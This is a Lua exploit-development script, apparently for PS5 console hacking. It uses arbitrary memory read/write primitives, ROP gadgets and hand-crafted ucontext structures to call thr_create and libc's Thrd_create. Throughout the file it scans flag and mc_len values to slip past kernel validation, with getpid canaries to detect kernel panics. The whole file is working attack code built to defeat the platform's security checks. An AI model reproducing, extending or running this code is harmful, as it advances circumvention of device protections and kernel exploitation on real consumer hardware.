-- CRASH_CLASS: HIGH
-- PROBE 126g: Use Thrd_create (C11 thrd_create) from libc instead of raw thr_create
-- Thrd_create handles ucontext internally — might bypass PS5 thr_create validation
-- Also try different thr_create flags and wider mc_len scan

print("=== PROBE 126g: THRD_CREATE + ALTERNATIVES ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Try Thrd_create from libc
print("--- SECTION A: THRD_CREATE (LIBC) ---")
local shared = memory.alloc(64)
memory.write_qword(shared, 0)

local ok_a, err_a = pcall(function()
    local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
    print("Thrd_create addr=" .. tostring(libc_addrofs.Thrd_create))

    -- thrd_create(thrd_t *thr, thrd_start_t func, void *arg)
    -- thrd_t is typically pthread_t (8 bytes)
    -- func = address of thread function: int (*)(void*)
    -- arg = void* argument passed to func

    -- For the thread function, we need a real C function.
    -- We can use a gadget that writes to memory:
    -- Use memcpy as the thread function (it's a real C function)
    -- memcpy(dst, src, n) — but it takes 3 args and thread func takes 1
    -- Better: find a function that takes void* and does something observable

    -- Actually, let's try using ret gadget as the function
    -- It will just return immediately (return value undefined)
    -- This is safe — the thread creates, runs ret, returns

    local thr_buf = memory.alloc(8)
    memory.write_qword(thr_buf, 0)

    -- Use gadgets.ret as the thread function
    -- On x86-64 SysV ABI: rdi=arg. The ret gadget ignores args.
    local ret = thrd_create_fn(thr_buf, gadgets.ret, uint64(0))
    print("Thrd_create ret=" .. tostring(ret) .. " numeric=" .. to_num(ret))

    local thr_id = memory.read_qword(thr_buf)
    print("thread id=" .. tostring(thr_id))

    -- Check errno
    local ok_e, es = pcall(get_error_string)
    if ok_e then print("errno: " .. es) end
end)
print("section A: ok=" .. tostring(ok_a) .. " err=" .. tostring(err_a))

-- Canary
local c1 = pcall(function() return to_num(syscall.getpid()) end)
print("canary1: " .. tostring(c1))
if not c1 then
    print("KERNEL PANIC AFTER THRD_CREATE")
    return
end

-- Section B: Try thr_create with different flags
print("")
print("--- SECTION B: THR_CREATE FLAGS ---")
local sc_thr_create = make_sc(430)

-- Standard FreeBSD 11 sizeof(mcontext_t)
-- Let's try with mc_len=0 (skip check?) and also various flag values
local flags_to_try = {0, 1, 2, 3, 0x10, 0x100}

for _, flags in ipairs(flags_to_try) do
    local UC_SIZE = 0x400
    local ucontext = memory.alloc(UC_SIZE)
    for off = 0, UC_SIZE - 4, 4 do memory.write_dword(ucontext + off, 0) end

    local mc = ucontext + 0x10
    memory.write_qword(mc + 0xA0, gadgets.ret)
    memory.write_qword(mc + 0xA8, uint64(0x43))
    memory.write_qword(mc + 0xB0, uint64(0x202))
    local tstack = memory.alloc(0x4000)
    memory.write_qword(mc + 0xB8, tstack + 0x3F00)
    memory.write_qword(mc + 0xC0, uint64(0x3B))
    memory.write_qword(mc + 0xC8, uint64(0x320))  -- mc_len
    memory.write_qword(mc + 0xD0, uint64(0x10000)) -- mc_fpformat
    memory.write_dword(mc + 0x90, 0x1)  -- mc_flags

    local tid_buf = memory.alloc(8)
    memory.write_qword(tid_buf, 0)

    local ret_val = 0xDEAD
    pcall(function()
        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_create, ucontext, tid_buf, flags)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then ret_val = to_num(memory.read_qword(ret_addr)) end
    end)

    local tid = to_num(memory.read_qword(tid_buf))
    print(string.format("  flags=0x%X: ret=%d tid=%d", flags, ret_val, tid))

    if not pcall(function() return to_num(syscall.getpid()) end) then
        print("  *** PANIC ***")
        break
    end
end

-- Section C: Wide mc_len binary search (16-byte steps from 0x100 to 0x600)
print("")
print("--- SECTION C: MC_LEN WIDE SCAN ---")
for mc_len_val = 0x100, 0x600, 0x10 do
    local UC_SIZE = 0x800
    local ucontext = memory.alloc(UC_SIZE)
    for off = 0, UC_SIZE - 4, 4 do memory.write_dword(ucontext + off, 0) end

    local mc = ucontext + 0x10
    memory.write_qword(mc + 0xA0, gadgets.ret)
    memory.write_qword(mc + 0xA8, uint64(0x43))
    memory.write_qword(mc + 0xB0, uint64(0x202))
    local tstack = memory.alloc(0x4000)
    memory.write_qword(mc + 0xB8, tstack + 0x3F00)
    memory.write_qword(mc + 0xC0, uint64(0x3B))
    memory.write_qword(mc + 0xC8, uint64(mc_len_val))
    memory.write_qword(mc + 0xD0, uint64(0x10000))
    memory.write_dword(mc + 0x90, 0x1)

    local tid_buf = memory.alloc(8)
    memory.write_qword(tid_buf, 0)

    local ret_val = 0xDEAD
    pcall(function()
        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_create, ucontext, tid_buf, 0)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then ret_val = to_num(memory.read_qword(ret_addr)) end
    end)

    if ret_val == 0 then
        print(string.format("*** mc_len=0x%X: ret=0 SUCCESS ***", mc_len_val))
        sleep(0.1, 's')
        break
    end

    if not pcall(function() return to_num(syscall.getpid()) end) then
        print(string.format("  mc_len=0x%X: PANIC", mc_len_val))
        break
    end
end

-- Section D: Try with mc_len=0 (maybe PS5 doesn't check)
print("")
print("--- SECTION D: MC_LEN=0 ---")
do
    local UC_SIZE = 0x400
    local ucontext = memory.alloc(UC_SIZE)
    for off = 0, UC_SIZE - 4, 4 do memory.write_dword(ucontext + off, 0) end

    local mc = ucontext + 0x10
    memory.write_qword(mc + 0xA0, gadgets.ret)
    memory.write_qword(mc + 0xA8, uint64(0x43))
    memory.write_qword(mc + 0xB0, uint64(0x202))
    local tstack = memory.alloc(0x4000)
    memory.write_qword(mc + 0xB8, tstack + 0x3F00)
    memory.write_qword(mc + 0xC0, uint64(0x3B))
    -- mc_len=0, mc_fpformat=0

    local tid_buf = memory.alloc(8)
    memory.write_qword(tid_buf, 0)

    local ret_val = 0xDEAD
    pcall(function()
        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_create, ucontext, tid_buf, 0)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then ret_val = to_num(memory.read_qword(ret_addr)) end
    end)

    print("mc_len=0: ret=" .. ret_val .. " tid=" .. to_num(memory.read_qword(tid_buf)))
end

print("canary: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 126g COMPLETE ===")
